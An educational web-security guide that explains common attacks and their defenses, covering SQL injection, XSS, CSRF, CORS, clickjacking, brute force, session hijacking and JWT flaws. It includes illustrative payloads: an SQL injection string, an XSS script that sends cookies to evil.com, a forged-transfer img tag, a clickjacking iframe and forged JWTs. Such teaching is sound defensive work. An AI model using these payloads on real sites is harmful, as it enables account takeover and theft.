# LEVEL 7 — Web Security (Threats + How to Handle Each)

This is the level where understanding *how an attack works* is what lets you actually defend against it — memorizing "use HTTPS" without knowing why doesn't help when you hit a new situation. This guide covers every threat you listed: how it works, a concrete example, a diagram, **and exactly how to prevent/handle it**, ending with the CORS vs CSRF distinction that trips up almost everyone.

---

## 1. SQL Injection

**What it is:** an attacker inserts malicious SQL into an input field, tricking your query into running commands you never intended.

### Example

```python
# Vulnerable code — string concatenation
query = f"SELECT * FROM users WHERE email = '{email}' AND password = '{password}'"
```

Attacker types this into the **email field**:
```
' OR '1'='1
```

The query becomes:

```sql
SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '...'
```

```
                 Intended query                Actual query (hijacked)
   ┌───────────────────────────┐    ┌──────────────────────────────┐
   │ WHERE email = 'real@a.com' │    │ WHERE email = '' OR '1'='1'     │
   │ AND password = 'correct'   │    │ AND password = 'anything'       │
   └───────────────────────────┘    └──────────────────────────────┘
     Only matches the real user       '1'='1' is ALWAYS true →
                                       matches EVERY row in the table
                                       → attacker logs in as the FIRST user
                                         in the database (often an admin)
```

### How to Handle / Overcome It

```
✅ Use parameterized queries / prepared statements — NEVER string concatenation

# Safe (Python + psycopg2 / Django ORM)
cursor.execute("SELECT * FROM users WHERE email = %s", [email])
User.objects.filter(email=email)   # Django ORM parameterizes automatically
```

```
User input                    Query template (fixed)
"' OR '1'='1"     ────►     WHERE email = %s
                             (input is treated as a VALUE, never as SQL code —
                              even if it contains quotes or SQL keywords,
                              the database engine keeps it isolated as data)
```

**Additional layers:**
- Use an ORM (Django ORM, SQLAlchemy) — it parameterizes by default.
- Apply the **principle of least privilege**: the app's DB user shouldn't have permission to `DROP TABLE` if it never needs to.
- Validate/sanitize input types (e.g. reject non-numeric input for an ID field).

---

## 2. XSS (Cross-Site Scripting)

**What it is:** an attacker injects malicious JavaScript into a page that **other users** view, which then runs in their browser with their session/cookies.

### Example

A comment form that displays user input **without escaping it**:

```html
<!-- Attacker submits this as a "comment" -->
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

If the server renders it directly into the page:

```html
<div class="comment">
  <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
</div>
```

```
Attacker                Server                    Victim's Browser
   │  posts <script>...</script>  │                       │
   ├───────────────────────────────►                       │
   │                               │  stores comment as-is   │
   │                               │  serves page to victim  │
   │                               ├───────────────────────────►
   │                               │           script EXECUTES in
   │                               │           victim's browser!
   │  ◄─────────────────────────────────────────────────────────
   │  victim's cookie/session stolen and sent to attacker's server
```

### Types of XSS

```
Stored XSS   → malicious script saved in the database (e.g. a comment),
                served to EVERY visitor who views that page

Reflected XSS → script comes from the URL/query params, reflected back
                 immediately in the response (e.g. a search results page
                 that echoes ?q=<script>...</script> back unescaped)

DOM-based XSS → the vulnerability lives entirely in client-side JS,
                 manipulating the page DOM using untrusted data,
                 without ever touching the server
```

### How to Handle / Overcome It

```
✅ Escape/encode output — treat all user input as TEXT, never as HTML

Raw input:    <script>alert('hi')</script>
Escaped:      &lt;script&gt;alert('hi')&lt;/script&gt;
              → browser displays it as TEXT, doesn't execute it
```

```
✅ Most modern frameworks escape by default:
   React: {userInput}                    → auto-escaped
   Django templates: {{ user_input }}    → auto-escaped
   Vue: {{ userInput }}                  → auto-escaped

   ⚠️ Danger zone — explicitly bypassing escaping:
   React: dangerouslySetInnerHTML={{ __html: userInput }}   ← avoid unless
   Django: {{ user_input | safe }}                            absolutely
   Vue: v-html="userInput"                                    necessary
```

**Additional layers:**
- **Content Security Policy (CSP)** header — restricts which scripts are allowed to run on your page at all, even if one slips through.
- **HttpOnly cookies** — prevents JavaScript (including injected XSS scripts) from reading `document.cookie` at all.
- Sanitize any HTML you DO intend to allow (e.g. rich text editors) using a library like DOMPurify.

---

## 3. CSRF (Cross-Site Request Forgery)

**What it is:** an attacker tricks a **logged-in user's browser** into making an unwanted request to a site they're authenticated on — exploiting the fact that cookies are sent automatically.

### Example

You're logged into `bank.com` (cookie-based session). You visit a malicious site that contains:

```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

```
   You (logged into bank.com)         evil-site.com          bank.com
        │                                   │                     │
        │  visit evil-site.com               │                     │
        ├────────────────────────────────────►                     │
        │  ◄────────────────────────────────────                     │
        │  page loads, includes hidden <img>  │                     │
        │  tag pointing to bank.com            │                     │
        │                                                            │
        │  browser AUTOMATICALLY sends the bank.com cookie           │
        │  (it doesn't know/care the request came from evil-site.com)│
        ├────────────────────────────────────────────────────────────►
        │  GET /transfer?to=attacker&amount=1000                     │
        │  Cookie: session_id=abc123 (attached automatically!)       │
        │  ◄────────────────────────────────────────────────────────────
        │  bank.com sees a VALID session cookie → executes transfer! │
```

**Key insight:** the attacker never sees your cookie or password — they just make your **own browser** send a request *using* your existing valid session, without your knowledge.

### How to Handle / Overcome It

```
✅ CSRF tokens — a random, unpredictable token embedded in forms,
   which must match what the server issued

1) Server renders a form with a hidden CSRF token:
   <input type="hidden" name="csrf_token" value="f3a9...">

2) Legitimate submission includes the token:
   POST /transfer   { amount: 1000, csrf_token: "f3a9..." }
   → server checks token matches → ✓ proceeds

3) Attacker's forged request from evil-site.com has NO WAY to know
   or include the correct csrf_token (it's not stored in a cookie
   that gets auto-attached — it must be read from the actual page)
   → server rejects it
```

```
✅ SameSite cookie attribute — tells the browser NOT to send this
   cookie on cross-site requests

Set-Cookie: session_id=abc123; SameSite=Strict
                                    │
                                    ▼
   Request from evil-site.com to bank.com → cookie is WITHHELD
   Request from bank.com itself → cookie is sent normally
```

**Additional layers:**
- Require **re-authentication** for highly sensitive actions (password change, large transfers).
- Check the `Origin`/`Referer` header on state-changing requests as a secondary check.

---

## 4. CORS (Cross-Origin Resource Sharing)

**What it is:** CORS is not an attack — it's a **browser security feature** that restricts whether JavaScript running on one origin (domain) can make requests to a **different** origin, and read the response.

### The Same-Origin Policy (what CORS relaxes)

```
Origin = protocol + domain + port

https://myapp.com:443   vs   https://api.myapp.com:443   → DIFFERENT origins!
https://myapp.com        vs   http://myapp.com             → DIFFERENT (protocol)
https://myapp.com:443    vs   https://myapp.com:8080       → DIFFERENT (port)
```

By default, browsers **block** JavaScript from one origin from reading responses from a different origin — this is the **Same-Origin Policy**. CORS is the mechanism that lets a server explicitly say "actually, this other origin IS allowed."

### Example Flow

```
Frontend: https://myapp.com     Backend API: https://api.myapp.com

   Browser JS                          Server
      │  fetch('https://api.myapp.com/data')     │
      ├─────────────────────────────────────────►│
      │                                            │  processes request
      │  ◄─────────────────────────────────────────│
      │  Response WITHOUT this header:              │
      │  Access-Control-Allow-Origin: https://myapp.com
      │                                            │
      │  ❌ Browser BLOCKS JavaScript from reading   │
      │     the response (even though the server     │
      │     already sent it back!)                   │
```

```
   With the correct header:
      │  ◄─────────────────────────────────────────│
      │  Access-Control-Allow-Origin: https://myapp.com │
      │  ✅ Browser ALLOWS JavaScript to read the response │
```

### How to Handle / Configure It

```
✅ Server explicitly whitelists allowed origins

Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PATCH, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true   ← needed if using cookies cross-origin
```

```python
# Django example (django-cors-headers)
CORS_ALLOWED_ORIGINS = [
    "https://myapp.com",
]
```

**Never do this in production:**
```
Access-Control-Allow-Origin: *      ← allows literally ANY website's JS
                                        to read your API responses
```

### Preflight Requests

For "non-simple" requests (e.g. `PATCH`, custom headers like `Authorization`), the browser sends an automatic `OPTIONS` request **first**, asking permission before sending the real request.

```
Browser                                    Server
   │  OPTIONS /api/users/5  (preflight)      │
   │  Origin: https://myapp.com               │
   ├───────────────────────────────────────────►
   │  ◄───────────────────────────────────────────
   │  Access-Control-Allow-Origin: https://myapp.com
   │  Access-Control-Allow-Methods: PATCH     │
   │                                            │
   │  ✅ Preflight approved → send real request   │
   │  PATCH /api/users/5                        │
   ├───────────────────────────────────────────►
```

---

## 5. CORS vs CSRF — The Critical Distinction

This is genuinely one of the most confused pairs in backend interviews, because both involve "cross-origin" requests — but they solve **opposite problems**.

```
CORS                                    CSRF
"Can JavaScript on Origin A READ         "Can a malicious site TRICK your
 a response from Origin B?"               browser into SENDING a request
                                           to Origin B using your existing
                                           credentials, without your consent?"

It's a BROWSER PROTECTION              It's an ATTACK TECHNIQUE
that the SERVER configures             that the SERVER must defend against

Controls: reading the RESPONSE         Controls: whether the REQUEST should
                                        even be trusted/acted upon
```

### The Key Insight: CORS Does NOT Prevent CSRF

```
CSRF attack (the <img> tag from earlier):
   <img src="https://bank.com/transfer?to=attacker&amount=1000">

This is a GET request. The browser SENDS it regardless of CORS —
CORS only controls whether the ATTACKER'S JAVASCRIPT can READ the
response. But a CSRF attack often doesn't care about reading the
response — the damage is already done the moment the request executes
server-side (the transfer already happened)!
```

```
                        Cross-origin REQUEST is made
                                    │
                    ┌───────────────┴───────────────┐
                    ▼                                 ▼
        Does the browser SEND it?          Can attacker's JS READ
        → YES, browsers send cross-          the response?
          origin requests by default        → Governed by CORS
        → This is what CSRF exploits         → Irrelevant to CSRF, since
                                               CSRF often doesn't need
                                               to read the response at all
```

### Side-by-Side Table

| | CORS | CSRF |
|---|---|---|
| What it is | A browser security **feature** | An attack **technique** |
| Who configures the defense | Server sets `Access-Control-Allow-Origin` | Server uses CSRF tokens / SameSite cookies |
| What it protects | Reading cross-origin **responses** | Unauthorized **actions** via forged requests |
| Does it stop the request from being sent? | No — the request still goes out | The CSRF token check happens server-side, rejecting the forged request |
| Common misconception | "CORS protects my API from attacks" | "If CORS is configured, I don't need CSRF protection" — **both false** |

**Necessity of understanding both together:** a server can have perfect CORS configuration and *still* be completely vulnerable to CSRF, because CORS was never designed to stop the request — only to stop JavaScript from reading the response. This is exactly why CSRF tokens and SameSite cookies are a **separate, additional** defense layer.

---

## 6. Clickjacking

**What it is:** an attacker overlays your legitimate site inside an invisible `<iframe>` on their own malicious page, tricking users into clicking something they didn't intend to.

### Example

```html
<!-- Attacker's page -->
<style>
  iframe {
    opacity: 0.0001;   /* invisible */
    position: absolute;
    top: 0; left: 0;
    width: 500px; height: 500px;
  }
</style>
<button>Click here to win a prize!</button>
<iframe src="https://bank.com/transfer-confirm"></iframe>
```

```
              What the user SEES              What's ACTUALLY there
        ┌─────────────────────────┐      ┌─────────────────────────┐
        │                           │      │  [invisible iframe]        │
        │   "Click to win a prize!"  │      │   bank.com's real           │
        │        [ BUTTON ]          │ ═══► │   "Confirm Transfer" button │
        │                           │      │   perfectly aligned under   │
        └─────────────────────────┘      │   the fake button            │
                                          └─────────────────────────┘

User clicks "Click to win a prize" → actually clicks
bank.com's real "Confirm Transfer" button underneath
```

### How to Handle / Overcome It

```
✅ X-Frame-Options header — tells the browser NOT to allow
   your site to be embedded in an iframe at all

X-Frame-Options: DENY              ← never allow framing
X-Frame-Options: SAMEORIGIN        ← only allow framing by your own site
```

```
✅ Modern equivalent: Content-Security-Policy frame-ancestors

Content-Security-Policy: frame-ancestors 'self';
                                    │
                                    ▼
                  Only your own origin may iframe this page
```

---

## 7. Brute Force Attacks

**What it is:** an attacker systematically tries many password combinations (or a list of common/leaked passwords) until one works.

```
Attacker script:
   POST /login  { email: "victim@mail.com", password: "123456" }    → fail
   POST /login  { email: "victim@mail.com", password: "password" }   → fail
   POST /login  { email: "victim@mail.com", password: "qwerty" }     → fail
   ... (thousands of attempts per second, automated)
   POST /login  { email: "victim@mail.com", password: "Summer2024!" } → SUCCESS
```

### How to Handle / Overcome It

```
✅ Rate limiting on login attempts (see next section)
✅ Account lockout after N failed attempts
✅ CAPTCHA after a few failures
✅ Enforce strong password policies (min length, complexity)
✅ MFA — even a correctly guessed password isn't enough on its own
```

```
Attempt 1-4: normal login flow
Attempt 5:   ⚠️ CAPTCHA required
Attempt 10:  🔒 Account temporarily locked (15 min)
             📧 Email alert sent to real account owner
```

---

## 8. Rate Limiting

**What it is:** restricting how many requests a client can make in a given time window — a defense mechanism, not an attack, but essential against brute force, scraping, and denial-of-service abuse.

```
Rule: max 5 login attempts per IP per minute

Time:     0s    10s   20s   30s   40s   50s   60s
Requests:  1     2     3     4     5     6 ❌  (7th, 8th... blocked)
                                       │
                                       ▼
                              429 Too Many Requests
                              Retry-After: 30
```

### How to Handle / Implement It

```
✅ Token bucket / sliding window algorithm (commonly backed by Redis)

Redis key: "rate_limit:login:192.168.1.5"
   INCR key           → increment attempt counter
   EXPIRE key 60       → resets after 60 seconds
   IF counter > 5:      → reject with 429
```

```
Client                          Server                    Redis
   │  POST /login (attempt 6)     │                          │
   ├────────────────────────────────►                          │
   │                               │  INCR rate_limit:ip        │
   │                               ├─────────────────────────────►
   │                               │  ◄─────────────────────────────
   │                               │  count = 6 (over limit!)     │
   │  ◄────────────────────────────────                          │
   │  429 Too Many Requests         │                          │
```

**Apply rate limiting at multiple levels:** per-IP (against distributed scripts), per-user-account (against credential stuffing), and per-API-key (for paying customers with quota tiers).

---

## 9. Session Hijacking

**What it is:** an attacker steals a valid session identifier (cookie or token) and uses it to impersonate the victim — no need to know their password at all.

```
How sessions get stolen:
1. XSS attack → document.cookie read and exfiltrated
2. Unencrypted HTTP → session ID sniffed over the network
3. Session fixation → attacker sets a known session ID before login
4. Physical/malware access to victim's device
```

```
Attacker steals: session_id=abc123
              │
              ▼
   Attacker's browser
   Cookie: session_id=abc123
              │
              ▼
   Server: "This session_id is valid, belongs to user 42"
              │
              ▼
   Attacker is now logged in AS the victim, no password needed
```

### How to Handle / Overcome It

```
✅ Always use HTTPS — encrypts traffic, prevents network sniffing
✅ HttpOnly cookies — JavaScript (and thus XSS) can't read the cookie
✅ Secure flag on cookies — cookie only sent over HTTPS, never HTTP
✅ Regenerate session ID after login (prevents session fixation)
✅ Bind sessions to additional signals (IP, user-agent) and flag anomalies
✅ Short session expiry + automatic logout on inactivity
```

```
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
                                  │           │            │
                                  │           │            └── not sent cross-site
                                  │           └── only sent over HTTPS
                                  └── JavaScript cannot read this cookie at all
```

---

## 10. JWT Vulnerabilities

JWTs solve a lot of problems, but introduce their own risks if implemented carelessly.

### `alg: none` Attack

```
Some JWT libraries historically accepted a JWT with the
algorithm explicitly set to "none" — meaning NO signature
verification happens at all.

Header: { "alg": "none" }
Payload: { "user_id": 1, "role": "admin" }  ← attacker just writes this
Signature: (empty)

If the server doesn't reject "alg: none" explicitly → INSTANT admin access
```

**Fix:** explicitly whitelist accepted algorithms (e.g. only accept `HS256` or `RS256`), never trust the algorithm specified in the token's own header blindly.

### Weak Secret Key

```
If the signing secret is weak/guessable (e.g. "secret123"),
an attacker can brute-force it offline, then forge ANY token:

forged_token = jwt.encode({ "user_id": 1, "role": "admin" }, "secret123")
```

**Fix:** use a long, cryptographically random secret (or asymmetric keys — `RS256` — where the public key can be shared safely for verification while the private signing key stays secret).

### No Expiry / Long Expiry

```
Token with no "exp" claim, or exp = 10 years from now
   → if stolen ONCE, valid basically FOREVER
```

**Fix:** short expiry (minutes, not years) + refresh token pattern (see Level 6).

### No Revocation Mechanism

```
User logs out / account compromised → but their JWT is still
technically VALID until it naturally expires (stateless by design!)
```

**Fix:** maintain a short-lived **blocklist** (in Redis, keyed by token ID, TTL matching remaining token life) for emergency revocation, while keeping tokens short-lived overall so the blocklist stays small.

```
Logout / security incident
         │
         ▼
   Add token's "jti" (unique ID) to Redis blocklist
   SET blocklist:jti_abc123  EX 900   (expires when token would anyway)
         │
         ▼
   Every request: check blocklist BEFORE trusting the token
```

---

## 11. Password Attacks (beyond brute force)

### Credential Stuffing

Using **leaked username/password pairs from OTHER breaches**, betting that users reuse passwords across sites.

```
Leaked from Site X breach: bob@mail.com / "Summer2024!"
              │
              ▼
   Attacker tries the SAME pair on Site Y, Site Z, Site W...
   (works because ~60%+ of people reuse passwords)
```

**Fix:** MFA (even a correct password isn't enough alone), check new passwords against known breach databases (e.g. "Have I Been Pwned" API) at signup/reset time, rate limiting.

### Dictionary Attack

Trying a curated list of **common passwords** (not every possible combination — brute force is exhaustive, dictionary attacks are targeted).

```
Wordlist: ["password", "123456", "qwerty", "letmein", "admin123", ...]
→ tried against many accounts, since these are statistically common
```

**Fix:** enforce password strength rules, reject common passwords outright at signup (check against a known-bad-password list).

---

## Quick-Reference: Attack → Defense

| Threat | Core Defense |
|---|---|
| SQL Injection | Parameterized queries / ORM, never string concatenation |
| XSS | Escape output by default, CSP header, HttpOnly cookies |
| CSRF | CSRF tokens, `SameSite` cookie attribute |
| CORS misconfig | Explicit origin whitelist, never `*` with credentials |
| Clickjacking | `X-Frame-Options` / `Content-Security-Policy: frame-ancestors` |
| Brute Force | Rate limiting, account lockout, CAPTCHA, MFA |
| (No) Rate Limiting | Redis-backed request counters per IP/user/key, `429` responses |
| Session Hijacking | HTTPS, `HttpOnly` + `Secure` + `SameSite` cookies, session regeneration |
| JWT vulnerabilities | Whitelist algorithms, strong secret, short expiry, revocation blocklist |
| Password attacks | MFA, breach-database checks, dictionary/common-password rejection |

---

## The One-Line Mental Model for CORS vs CSRF (memorize this)

```
CORS  → "Can this website's JAVASCRIPT READ the response from my API?"
         (a browser feature, configured by YOUR server)

CSRF  → "Can this website TRICK my browser into SENDING a request
         to my API using MY existing login session?"
         (an attack, defended against by YOUR server, separately from CORS)
```
